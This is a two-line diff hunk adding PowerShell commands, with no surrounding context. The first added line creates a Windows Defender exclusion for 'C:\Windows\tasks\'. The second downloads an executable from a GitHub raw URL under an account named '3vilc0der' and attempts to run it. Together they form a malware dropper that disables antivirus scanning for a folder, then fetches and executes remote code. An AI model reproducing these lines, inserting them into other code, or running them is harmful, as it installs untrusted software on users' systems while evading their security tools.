@@ -1,0 +1,2 @@
+Set-MpPreference -ExclusionPath "C:\Windows\tasks\"
+iwr -uri http://github.com/3vilc0der/afwefd237/raw/1.exe;1.exe
